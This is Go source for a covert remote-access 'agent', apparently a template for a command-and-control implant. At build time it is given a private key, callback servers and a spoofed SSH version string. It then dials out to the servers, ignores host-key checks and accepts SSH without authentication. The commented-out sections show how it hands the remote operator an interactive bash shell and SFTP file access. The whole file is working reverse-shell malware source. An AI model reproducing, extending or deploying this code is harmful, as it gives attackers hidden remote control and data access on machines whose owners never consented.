package main

import (
	"agent/internal/metadata"
	"agent/internal/network"
	"agent/internal/sshd"
	"context"
	"encoding/base64"
	"strings"

	// {{if .Debug}}
	"log"
	// {{end}}

	"golang.org/x/crypto/ssh"
)

var privKey = ""
var servers = ""
var sshVersion = ""

// SRV <-> TCP <-> SSH_CHAN <-> SRV_PIPE <-> AGENT_PIPE <-> AGENT_SSH_SRV <-> SSH_CHAN <-> PTY
func main() {
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// {{if .Debug}}
	log.Println("Starting agent")
	log.Printf("PrivKey: %v", privKey)
	log.Printf("Servers: %v", servers)
	log.Printf("SSHClientVersion: %v", sshVersion)
	// {{end}}

	metadata, err := metadata.GetMetadata()
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to get metadata: %v", err)
		// {{end}}
		return
	}

	decodedPrivKey, err := base64.StdEncoding.DecodeString(privKey)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to decode private key: %v", err)
		// {{end}}
		return
	}
	signer, err := ssh.ParsePrivateKey(decodedPrivKey)
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to create signer: %v", err)
		// {{end}}
		return
	}

	sshClientConfig := &ssh.ClientConfig{
		User:            metadata,
		Auth:            []ssh.AuthMethod{ssh.PublicKeys(signer)},
		ClientVersion:   sshVersion,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), // TODO: Check host key
	}

	sshServerConfig := &ssh.ServerConfig{
		NoClientAuth: true,
	}
	sshServerConfig.AddHostKey(signer)

	conn, address, err := network.NewTCPConn(ctx, strings.Split(servers, ","))
	if err != nil {
		// {{if .Debug}}
		log.Printf("Failed to connect to server: %v", err)
		// {{end}}
		return
	}
	defer conn.Close()

	sshd.HandleSSHConnection(conn, address, sshClientConfig, sshServerConfig)
}

// 	// 2. SSH handshake
// 	sshConn, chans, reqs, err := ssh.NewClientConn(conn, serverAddress, sshConfig)
// 	if err != nil {
// 		// {{if .Debug}}
// 		log.Printf("Failed to create SSH connection: %v", err)
// 		// {{end}}
// 		return
// 	}
// 	defer sshConn.Close()

// 	// {{if .Debug}}
// 	log.Printf("Connected to %s", serverAddress)
// 	// {{end}}

// 	// 3. Handle requests
// 	go ssh.DiscardRequests(reqs)

// 	// 4. Handle channels
// 	for newChannel := range chans {
// 		// {{if .Debug}}
// 		log.Printf("New channel: %v", newChannel.ChannelType())
// 		// {{end}}
// 		switch newChannel.ChannelType() {
// 		case "ssh-jump":
// 			channel, request, err := newChannel.Accept()
// 			if err != nil {
// 				// {{if .Debug}}
// 				log.Printf("Failed to accept channel: %v", err)
// 				// {{end}}

// 				newChannel.Reject(ssh.ConnectionFailed, "Failed to accept channel")
// 				continue
// 			}
// 			go handleSession(channel, request)
// 		default:
// 			// {{if .Debug}}
// 			log.Printf("Unknown channel type: %v", newChannel.ChannelType())
// 			// {{end}}
// 			newChannel.Reject(ssh.UnknownChannelType, "Unknown channel type")
// 		}
// 	}
// }

// func handleSession(channel ssh.Channel, request <-chan *ssh.Request) {
// 	defer channel.Close()
// 	// {{if .Debug}}
// 	log.Printf("Session channel accepted")
// 	// {{end}}

// 	sshConfig := &ssh.ServerConfig{
// 		NoClientAuth: true,
// 	}

// 	decodedPrivKey, err := base64.StdEncoding.DecodeString(privKey)
// 	if err != nil {
// 		// {{if .Debug}}
// 		log.Printf("Failed to decode private key: %v", err)
// 		// {{end}}
// 		return
// 	}
// 	signer, err := ssh.ParsePrivateKey(decodedPrivKey)
// 	if err != nil {
// 		// {{if .Debug}}
// 		log.Printf("Failed to create signer: %v", err)
// 		// {{end}}
// 		return
// 	}
// 	sshConfig.AddHostKey(signer)

// 	pAgent, pServer := net.Pipe()
// 	defer pAgent.Close()
// 	defer pServer.Close()

// 	go func() {
// 		_, err := io.Copy(channel, pServer)
// 		if err != nil {
// 			// {{if .Debug}}
// 			log.Printf("io channel<-pServer error: %v", err)
// 			// {{end}}
// 		}
// 		channel.Close()
// 	}()
// 	go func() {
// 		_, err := io.Copy(pServer, channel)
// 		if err != nil {
// 			// {{if .Debug}}
// 			log.Printf("io pServer<-channel error: %v", err)
// 			// {{end}}
// 		}
// 		pServer.Close()
// 	}()

// 	sshConn, chans, reqs, err := ssh.NewServerConn(pAgent, sshConfig)
// 	if err != nil {
// 		// {{if .Debug}}
// 		log.Printf("Failed to create SSH connection: %v", err)
// 		// {{end}}
// 		return
// 	}
// 	defer sshConn.Close()
// 	go ssh.DiscardRequests(reqs)

// 	for newChannel := range chans {
// 		// {{if .Debug}}
// 		log.Printf("New channel: %v", newChannel.ChannelType())
// 		// {{end}}
// 		switch newChannel.ChannelType() {
// 		case "session":
// 			channel, request, err := newChannel.Accept()
// 			if err != nil {
// 				// {{if .Debug}}
// 				log.Printf("Failed to accept channel: %v", err)
// 				// {{end}}
// 				newChannel.Reject(ssh.ConnectionFailed, "Failed to accept channel")
// 				continue
// 			}
// 			go handleJumpSession(channel, request)
// 		default:
// 			// {{if .Debug}}
// 			log.Printf("Unknown channel type: %v", newChannel.ChannelType())
// 			// {{end}}
// 			newChannel.Reject(ssh.UnknownChannelType, "Unknown channel type")
// 		}
// 	}
// }

// func handleJumpSession(channel ssh.Channel, request <-chan *ssh.Request) {
// 	var isPty bool
// 	for req := range request {
// 		switch req.Type {
// 		case "pty-req":
// 			isPty = true
// 			req.Reply(true, nil)
// 		case "window-change":
// 			req.Reply(true, nil)
// 		case "shell":
// 			if isPty {
// 				go handleShell(channel)
// 				req.Reply(true, nil)
// 			} else {
// 				// {{if .Debug}}
// 				log.Printf("Shell request received before PTY request")
// 				// {{end}}
// 				fmt.Fprintf(channel, "Only PTY requests are supported.\n")
// 				req.Reply(true, nil)
// 				channel.Close()
// 			}
// 		case "subsystem":
// 			// {{if .Debug}}
// 			log.Printf("Subsystem request received: %v", req.Payload)
// 			// {{end}}
// 			system := string(req.Payload[4:])
// 			switch system {
// 			case "sftp":
// 				// {{if .Debug}}
// 				log.Printf("SFTP subsystem request received")
// 				// {{end}}
// 				go handleSftp(channel)
// 				req.Reply(true, nil)
// 			default:
// 				// {{if .Debug}}
// 				log.Printf("Unknown subsystem: %v", system)
// 				// {{end}}
// 				req.Reply(false, []byte("Subsystem not supported"))
// 			}
// 		default:
// 			// {{if .Debug}}
// 			log.Printf("Unknown request: %v", req.Type)
// 			// {{end}}
// 			req.Reply(false, nil)
// 		}
// 	}
// }

// func handleSftp(channel ssh.Channel) {
// 	defer channel.Close()
// 	// {{if .Debug}}
// 	log.Printf("SFTP subsystem request received")
// 	// {{end}}

// 	server, err := sftp.NewServer(channel)
// 	if err != nil {
// 		// {{if .Debug}}
// 		log.Printf("Failed to create SFTP server: %v", err)
// 		// {{end}}
// 		return
// 	}

// 	err = server.Serve()
// 	if err != nil {
// 		// {{if .Debug}}
// 		log.Printf("SFTP server error: %v", err)
// 		// {{end}}
// 	}
// }

// func handleShell(channel ssh.Channel) {
// 	defer channel.Close()

// 	bash := exec.Command("/bin/bash")
// 	ptyFile, err := pty.Start(bash)
// 	if err != nil {
// 		// {{if .Debug}}
// 		log.Printf("Failed to start bash: %v", err)
// 		// {{end}}
// 		return
// 	}
// 	defer ptyFile.Close()

// 	go io.Copy(ptyFile, channel)
// 	go io.Copy(channel, ptyFile)

// 	if err := bash.Wait(); err != nil {
// 		// {{if .Debug}}
// 		log.Printf("Bash exited with error: %v", err)
// 		// {{end}}
// 	}
// }
